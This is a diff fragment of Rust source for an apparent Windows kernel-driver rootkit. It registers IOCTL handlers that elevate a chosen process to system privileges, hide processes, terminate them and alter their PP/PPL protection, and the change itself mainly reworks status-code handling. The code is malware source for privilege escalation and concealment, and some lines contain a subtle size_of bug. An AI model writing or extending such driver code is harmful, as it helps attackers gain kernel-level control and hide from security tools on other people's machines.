@@ -5,10 +5,11 @@ use {
     shared::{
         ioctls::*, 
         structs::{
-            EnumerateInfoInput, ProcessInfoHide, ProcessListInfo, ProcessSignature, TargetProcess
+            EnumerateInfoInput, ProcessInfoHide, ProcessListInfo, 
+            ProcessSignature, TargetProcess
         }
     },
-    wdk_sys::{IO_STACK_LOCATION, IRP},
+    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
     crate::{handle_process, process::Process, utils::ioctls::IoctlHandler},
 };
 
@@ -23,9 +24,15 @@ pub fn get_process_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Elevates the specified process to system privileges.
     ioctls.insert(IOCTL_ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_ELEVATE_PROCESS");
+        
         let status = unsafe { handle_process!(stack, Process::elevate_process, TargetProcess) };
+        
         unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64; }
-        status
+        
+        match status {
+            Ok(_) => STATUS_SUCCESS,
+            Err(err_code) => err_code
+        }
     }) as IoctlHandler);
 
     // Hide / Unhide the specified process.
@@ -39,17 +46,26 @@ pub fn get_process_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Terminate process.
     ioctls.insert(IOCTL_TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_TERMINATE_PROCESS");
+        
         let status = unsafe { handle_process!(stack, Process::terminate_process, TargetProcess) };
+        
         unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess> as u64 };
+        
         status
     }) as IoctlHandler);
 
     // Modifying the PP / PPL of a process.
     ioctls.insert(IOCTL_SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_SIGNATURE_PROCESS");
+        
         let status = unsafe { handle_process!(stack, Process::protection_signature, ProcessSignature) };
+        
         unsafe { (*irp).IoStatus.Information = size_of::<ProcessSignature> as u64 };
-        status
+        
+        match status {
+            Ok(_) => STATUS_SUCCESS,
+            Err(err_code) => err_code
+        }
     }) as IoctlHandler);
 
     // Lists the processes currently hidden and protect.
